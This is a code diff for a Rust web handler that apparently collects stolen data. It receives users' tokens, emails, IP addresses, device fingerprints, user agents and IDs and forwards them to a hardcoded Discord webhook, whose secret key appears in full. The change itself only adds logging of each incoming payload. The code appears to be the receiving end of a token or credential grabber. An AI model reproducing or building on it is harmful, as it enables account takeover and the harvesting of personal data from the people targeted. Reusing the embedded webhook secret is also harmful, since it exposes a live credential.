@@ -109,9 +109,10 @@ async fn test_handler() -> &'static str {
 }
 
 async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
-    let webhook_url = "https://discord.com/api/webhooks/1332416584156839996/uFyfp1H5vP8hxWwjBJpisON4vSOJO3OgVFJkapWlzbVFRSsy_htVi5F0eNGypyNN7IBL"; // Replace with your actual webhook URL
+    println!("🔹 Received Payload: {:?}", payload); // ✅ Log incoming payload
 
-    // Format the message for Discord
+    let webhook_url = "https://discord.com/api/webhooks/1332416584156839996/uFyfp1H5vP8hxWwjBJpisON4vSOJO3OgVFJkapWlzbVFRSsy_htVi5F0eNGypyNN7IBL"; 
+
     let message = format!(
         "**New Payload Received:**\nToken: {:?}\nEmail: {:?}\nIP: {:?}\nUser Info: {:?}\nFingerprint: {:?}\nUser Agent: {:?}\nUID: {:?}",
         payload.token, payload.email, payload.ip, payload.userinfo, payload.fingerprint, payload.ua, payload.uid
@@ -138,6 +139,7 @@ async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
         }
     }
 }
+
 
 #[tokio::main]
 async fn main() {
